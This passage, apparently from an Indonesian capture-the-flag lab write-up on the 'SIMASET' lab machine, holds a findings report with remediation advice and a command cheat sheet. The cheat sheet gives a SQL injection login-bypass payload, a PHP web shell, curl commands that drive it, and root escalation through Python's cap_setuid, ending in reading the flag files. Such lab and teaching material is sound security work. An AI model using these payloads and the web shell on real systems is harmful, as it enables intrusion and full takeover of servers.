→ os.setuid(0)
→ uid=0(root)
→ find / -name flag.txt
→ /home/pengelola/flag.txt
→ /root/flag.txt
→ cat kedua flag
```

---

# Bagian B — Analisis Temuan dan Rekomendasi

## 1. Rantai Kerentanan

```text
Form login menerima input tidak aman
→ query SQL dapat dimanipulasi
→ autentikasi admin dilewati
→ attacker memperoleh akses panel upload
→ upload menerima file PHP
→ file disimpan di web-accessible directory
→ Apache mengeksekusi file
→ RCE sebagai www-data
→ Python memiliki cap_setuid=ep
→ os.setuid(0)
→ root pada environment aplikasi
→ seluruh flag dapat dibaca
```

Eksploitasi penuh terjadi karena kombinasi beberapa kegagalan kontrol. SQL injection saja memberikan akses panel. Upload file berbahaya mengubah akses panel menjadi RCE. Capability berbahaya pada Python mengubah RCE berprivilege rendah menjadi root.

---

## 2. Temuan 1 — SQL Injection pada Login Pengelola

### Deskripsi

Field username menerima payload:

```text
' OR '1'='1'-- -
```

dan berhasil melewati autentikasi.

### Evidence

```text
Input username:
' OR '1'='1'-- -

Hasil:
Panel Pengelola — admin
```

### Dampak

Attacker dapat:

- mengakses fungsi administratif;
- melihat data aset;
- menggunakan fitur upload;
- memanipulasi data;
- mengambil alih aplikasi melalui fungsi lanjutan.

### Severity Indikatif

```text
Critical
```

Severity tinggi karena bypass autentikasi membuka akses ke fungsi upload yang dapat dieksploitasi menjadi RCE.

### Rekomendasi

Gunakan prepared statement atau parameterized query.

Contoh PHP PDO:

```php
$stmt = $pdo->prepare(
    'SELECT id, username, password_hash
     FROM users
     WHERE username = :username'
);

$stmt->execute([
    ':username' => $username
]);

$user = $stmt->fetch();
```

Validasi password dengan:

```php
password_verify($password, $user['password_hash']);
```

Tambahkan:

```text
generic error message
rate limiting
account lockout proporsional
MFA untuk admin
audit login
```

---

## 3. Temuan 2 — Unrestricted File Upload dan Eksekusi PHP

### Deskripsi

Panel upload yang seharusnya menerima JPG/PNG menerima:

```text
shell.php
```

dengan isi:

```php
GIF89a;
<?php system($_GET['cmd']); ?>
```

File kemudian dapat diakses dan dieksekusi dari:

```text
/uploads/shell.php
```

### Evidence

```text
Foto aset "shell.php" berhasil diunggah.
```

```text
/uploads/shell.php?cmd=id
→ uid=33(www-data)
```

### Dampak

Attacker dapat:

- menjalankan command OS;
- membaca source code dan konfigurasi;
- mengakses credential;
- memodifikasi aplikasi;
- mempertahankan persistence;
- melakukan privilege escalation;
- mengambil alih container.

### Severity Indikatif

```text
Critical
```

### Rekomendasi Utama

Simpan upload di luar web root.

Contoh:

```text
/var/lib/simaset/uploads/
```

Bukan:

```text
/var/www/html/uploads/
```

Gunakan nama file acak:

```text
UUID + extension allowlist
```

Validasi berlapis:

```text
allowlist extension: jpg, jpeg, png
MIME detection server-side
decode dan re-encode image
ukuran maksimum
dimensi maksimum
hapus metadata
tolak multiple extension
tolak null byte
tolak file executable
```

Nonaktifkan eksekusi PHP pada direktori upload.

Contoh Apache:

```apache
<Directory "/var/www/html/uploads">
    php_admin_flag engine off
    Options -ExecCGI
    RemoveHandler .php .phtml .phar
    RemoveType .php .phtml .phar
    AllowOverride None
</Directory>
```

Lebih aman, pindahkan upload di luar document root dan sajikan melalui endpoint download yang memaksa:

```text
Content-Disposition: attachment
X-Content-Type-Options: nosniff
```

---

## 4. Temuan 3 — Linux Capability Berbahaya pada Python

### Deskripsi

Binary berikut memiliki capability:

```text
/usr/bin/python3.13 cap_setuid=ep
```

Interpreter Python dapat mengubah UID proses menjadi root menggunakan:

```python
os.setuid(0)
```

### Evidence

```text
getcap -r /
→ /usr/bin/python3.13 cap_setuid=ep
```

```text
/usr/bin/python3.13 -c 'import os; os.setuid(0); os.system("id; whoami")'
→ uid=0(root)
→ root
```

### Dampak

Setiap account lokal yang dapat menjalankan Python tersebut dapat memperoleh UID 0. Dalam exploit chain ini, RCE `www-data` langsung berubah menjadi root.

### Severity Indikatif

```text
Critical
```

### Rekomendasi

Hapus capability:

```bash
setcap -r /usr/bin/python3.13
```

Verifikasi:

```bash
getcap /usr/bin/python3.13
```

Expected:

```text
tidak ada output
```

Audit seluruh filesystem:

```bash
getcap -r / 2>/dev/null
```

Hindari pemberian capability kepada:

```text
interpreter
shell
text processor
debugger
binary yang dapat memuat plugin
binary yang dapat menjalankan command eksternal
```

---

## 5. Temuan 4 — Cookie dan Security Header Tidak Memadai

### Deskripsi

Nikto menunjukkan:

```text
PHPSESSID tanpa HttpOnly
beberapa security header tidak tersedia
```

### Dampak

Temuan ini tidak menjadi jalur utama exploit, tetapi meningkatkan risiko:

```text
pencurian session melalui XSS
MIME sniffing
clickjacking jika header frame juga tidak ada
kebocoran referrer
kebijakan browser yang lemah
```

### Rekomendasi Cookie

```ini
session.cookie_httponly = 1
session.cookie_secure = 1
session.cookie_samesite = Lax
```

Gunakan `Secure` hanya melalui HTTPS.

### Rekomendasi Header

```apache
Header always set X-Content-Type-Options "nosniff"
Header always set Referrer-Policy "strict-origin-when-cross-origin"
Header always set Content-Security-Policy "default-src 'self'"
Header always set Permissions-Policy "camera=(), microphone=(), geolocation=()"
```

HSTS hanya diterapkan setelah HTTPS aktif secara benar:

```apache
Header always set Strict-Transport-Security "max-age=31536000; includeSubDomains"
```

---

## 6. Temuan 5 — Indikasi Environment Container

### Deskripsi

Hostname:

```text
e84f45876e9c
```

menyerupai container ID.

### Dampak

Root di dalam container memberikan kontrol penuh terhadap:

```text
filesystem container
proses container
environment variable
source code
credential aplikasi
volume yang di-mount
```

Namun, hal tersebut tidak otomatis membuktikan kompromi host.

### Rekomendasi Container

```text
jalankan aplikasi sebagai non-root
hapus sudo dari image
gunakan read-only root filesystem
drop seluruh capability yang tidak diperlukan
gunakan no-new-privileges
jangan mount docker.sock
jangan gunakan --privileged
batasi volume host
gunakan seccomp/AppArmor/SELinux
patch image secara rutin
gunakan image minimal
```

Contoh Docker:

```bash
docker run \
  --read-only \
  --cap-drop=ALL \
  --security-opt no-new-privileges:true \
  --user 1000:1000 \
  <image>
```

---

## 7. Severity dan Rantai Dampak

| Temuan | Dampak | Severity Indikatif |
|---|---|---|
| SQL Injection login | Authentication bypass admin | Critical |
| Unrestricted file upload | PHP web shell dan RCE | Critical |
| Python `cap_setuid=ep` | Privilege escalation menjadi UID 0 | Critical |
| Cookie tanpa HttpOnly | Risiko pencurian session | Medium |
| Security header tidak lengkap | Hardening browser tidak memadai | Low–Medium |
| Container hardening lemah | Potensi perluasan scope | Tergantung konfigurasi |

---

## 8. Prioritas Perbaikan

### Prioritas 1 — Tutup Jalur RCE

```text
nonaktifkan sementara fungsi upload
hapus seluruh web shell
blok eksekusi PHP pada /uploads/
pindahkan upload di luar web root
```

### Prioritas 2 — Perbaiki Login

```text
prepared statement
password hashing
MFA admin
rotasi credential
invalidasi seluruh session
```

### Prioritas 3 — Hapus Capability

```bash
setcap -r /usr/bin/python3.13
getcap -r / 2>/dev/null
```

### Prioritas 4 — Investigasi

Cari indikator:

```text
' OR '1'='1'-- -
shell.php
GIF89a;
system($_GET['cmd'])
/uploads/*.php
getcap -r /
os.setuid(0)
```

Tinjau:

```text
Apache access log
PHP error log
upload directory
session database
audit/process log
container runtime log
outbound connection
filesystem changes
```

---

## 9. Checklist Evidence untuk Laporan

| Tahap | Evidence yang Dicatat |
|---|---|
| Host discovery | `192.168.56.14` aktif |
| Service scan | `80/tcp` terbuka |
| Service version | Apache `2.4.67` Debian |
| Runtime | PHP `8.2.31` |
| HTTP title | `Beranda | SIMASET` |
| Admin discovery | `/admin/index.php` |
| Config hint | `/db.php` |
| SQL injection | `' OR '1'='1'-- -` |
| Auth bypass | Panel Pengelola sebagai `admin` |
| Upload | `shell.php` berhasil disimpan |
| Web shell | `/uploads/shell.php` |
| Initial access | UID 33 `www-data` |
| Hostname | `e84f45876e9c` |
| Working directory | `/var/www/html/uploads` |
| SUID enumeration | Daftar binary SUID standar |
| Sudo | `sudo: not found` |
| Capability | `/usr/bin/python3.13 cap_setuid=ep` |
| Root proof | `uid=0(root)` dan `whoami=root` |
| Flag discovery | `/home/pengelola/flag.txt`, `/root/flag.txt` |
| User flag | `FLAG{sql_un10n_upl04d_7c4e9a13}` |
| Root flag | `FLAG{r00t_aset_pr1v3sc_3e8b6f20}` |

---

## 10. Ringkasan Temuan Siap Laporan

```text
Aplikasi SIMASET pada 192.168.56.14 memiliki kerentanan SQL Injection pada
halaman login pengelola. Payload boolean-based authentication bypass berhasil
melewati proses autentikasi dan memberikan akses ke Panel Pengelola sebagai
admin tanpa credential yang sah.

Panel pengelola menyediakan fungsi upload foto aset. Validasi file tidak
memadai sehingga file PHP yang diawali signature GIF89a dapat diunggah dengan
nama shell.php. File disimpan pada direktori /uploads/ yang dapat diakses dari
web dan tetap diproses oleh interpreter PHP. Pemanggilan shell.php dengan
parameter cmd menghasilkan remote command execution sebagai account www-data.

Setelah initial access, enumerasi privilege menemukan bahwa sudo tidak tersedia
dan daftar SUID hanya memuat binary standar. Enumerasi Linux capabilities
menemukan /usr/bin/python3.13 memiliki cap_setuid=ep. Capability tersebut dapat
disalahgunakan melalui os.setuid(0) sehingga command berjalan dengan UID 0.
Dengan privilege root, penguji menemukan dan membaca flag pada
/home/pengelola/flag.txt dan /root/flag.txt.

Rantai kerentanan menunjukkan bahwa kegagalan validasi input, kontrol upload
yang lemah, konfigurasi web server yang mengizinkan eksekusi pada direktori
upload, serta capability berbahaya pada interpreter memungkinkan kompromi
penuh terhadap environment aplikasi. Hostname mengindikasikan kemungkinan
container, sehingga scope terhadap host harus diverifikasi secara terpisah.
```

---

# Bagian C — Close Book dan Cheat Sheet

> Gunakan bagian ini setelah memahami pembahasan detail. Command hanya untuk target LAB `192.168.56.14`.

---

## 1. Set Variabel

```bash
NETWORK="192.168.56.0/24"
TARGET="192.168.56.14"
WEB="http://192.168.56.14"
ADMIN="$WEB/admin/index.php"
SHELL_URL="$WEB/uploads/shell.php"
```

---

## 2. Recon

```bash
nmap -sn "$NETWORK"
nmap -sC -sV "$TARGET"
nikto -h "$WEB"
```

Expected:

```text
80/tcp open http Apache 2.4.67 Debian
Beranda | SIMASET
/admin/index.php
/db.php
PHP/8.2.31
```

---

## 3. SQL Injection Login

Buka:

```text
http://192.168.56.14/admin/index.php
```

Username:

```text
' OR '1'='1'-- -
```

Password:

```text
test
```

Expected:

```text
Panel Pengelola — admin
```

---

## 4. Buat Web Shell

```bash
cat > shell.php <<'EOF'
GIF89a;
<?php system($_GET['cmd']); ?>
EOF
```

---

## 5. Upload

Pada panel admin:

```text
Choose File
→ shell.php
→ Unggah Foto
```

Expected:

```text
Foto aset "shell.php" berhasil diunggah.
```

---

## 6. Validasi RCE

Browser:

```text
http://192.168.56.14/uploads/shell.php?cmd=id
```

Curl:

```bash
curl -sG \
  --data-urlencode 'cmd=id; whoami; hostname; pwd' \
  "$SHELL_URL"
```

Expected:

```text
uid=33(www-data)
www-data
e84f45876e9c
/var/www/html/uploads
```

---

## 7. Enumerasi Privilege

SUID:

```bash
curl -sG \
  --data-urlencode 'cmd=find / -perm -4000 -type f 2>/dev/null' \
  "$SHELL_URL"
```

Sudo:

```bash
curl -sG \
  --data-urlencode 'cmd=sudo -l 2>&1' \
  "$SHELL_URL"
```

Expected:

```text
sudo: not found
```

Capabilities:

```bash
curl -sG \
  --data-urlencode 'cmd=getcap -r / 2>/dev/null' \
  "$SHELL_URL"
```

Expected:

```text
/usr/bin/python3.13 cap_setuid=ep
```

---

## 8. Root

```bash
curl -sG \
  --data-urlencode 'cmd=/usr/bin/python3.13 -c '\''import os; os.setuid(0); os.system("id; whoami")'\''' \
  "$SHELL_URL"
```

Expected:

```text
uid=0(root) gid=33(www-data) groups=33(www-data)
root
```

---

## 9. Cari Flag

```bash
curl -sG \
  --data-urlencode 'cmd=/usr/bin/python3.13 -c '\''import os; os.setuid(0); os.system("find / -type f -name \"flag.txt\" 2>/dev/null")'\''' \
  "$SHELL_URL"
```

Expected:

```text
/home/pengelola/flag.txt
/root/flag.txt
```

---

## 10. Baca User Flag

```bash
curl -sG \
  --data-urlencode 'cmd=/usr/bin/python3.13 -c '\''import os; os.setuid(0); print(open("/home/pengelola/flag.txt").read())'\''' \
  "$SHELL_URL"
```

Expected:

```text
FLAG{sql_un10n_upl04d_7c4e9a13}
```

---

## 11. Baca Root Flag

```bash
curl -sG \
  --data-urlencode 'cmd=/usr/bin/python3.13 -c '\''import os; os.setuid(0); print(open("/root/flag.txt").read())'\''' \
  "$SHELL_URL"
```

Expected:

```text
FLAG{r00t_aset_pr1v3sc_3e8b6f20}
```

---

## Cheat Sheet Paling Pendek

```text
nmap -sC -sV 192.168.56.14
nikto -h http://192.168.56.14

http://192.168.56.14/admin/index.php

Username:
' OR '1'='1'-- -

shell.php:
GIF89a;
<?php system($_GET['cmd']); ?>

Upload shell.php
http://192.168.56.14/uploads/shell.php?cmd=id

SHELL_URL="http://192.168.56.14/uploads/shell.php"

curl -sG --data-urlencode 'cmd=id;whoami;hostname;pwd' "$SHELL_URL"
curl -sG --data-urlencode 'cmd=find / -perm -4000 -type f 2>/dev/null' "$SHELL_URL"
curl -sG --data-urlencode 'cmd=sudo -l 2>&1' "$SHELL_URL"
curl -sG --data-urlencode 'cmd=getcap -r / 2>/dev/null' "$SHELL_URL"

curl -sG --data-urlencode 'cmd=/usr/bin/python3.13 -c '\''import os; os.setuid(0); os.system("id; whoami")'\''' "$SHELL_URL"

curl -sG --data-urlencode 'cmd=/usr/bin/python3.13 -c '\''import os; os.setuid(0); os.system("find / -type f -name \"flag.txt\" 2>/dev/null")'\''' "$SHELL_URL"

curl -sG --data-urlencode 'cmd=/usr/bin/python3.13 -c '\''import os; os.setuid(0); print(open("/home/pengelola/flag.txt").read())'\''' "$SHELL_URL"

curl -sG --data-urlencode 'cmd=/usr/bin/python3.13 -c '\''import os; os.setuid(0); print(open("/root/flag.txt").read())'\''' "$SHELL_URL"
```

---

# Alur Hafalan Akhir

```text
SCAN
→ ADMIN
→ SQLI
→ LOGIN BYPASS
→ UPLOAD
→ PHP SHELL
→ WWW-DATA
→ GETCAP
→ PYTHON
→ SETUID 0
→ ROOT
→ FIND FLAG
→ CAT FLAG
```

## Mnemonic

```text
S.A.U.C.E.R.

S = Scan target
A = Admin login
U = Use SQL injection
C = Create and upload shell
E = Enumerate capabilities
R = Root through Python
```

---

## Penutup

Lab SIMASET menunjukkan bahwa satu kelemahan jarang berdiri sendiri. SQL injection memberikan akses admin, upload tidak aman memberikan RCE, dan capability berbahaya pada Python menghilangkan batas privilege.

Dua tindakan perbaikan yang paling mendesak:

```text
1. Perbaiki query login menggunakan prepared statement.
2. Hapus cap_setuid dari /usr/bin/python3.13 dan blok eksekusi pada direktori upload.
```
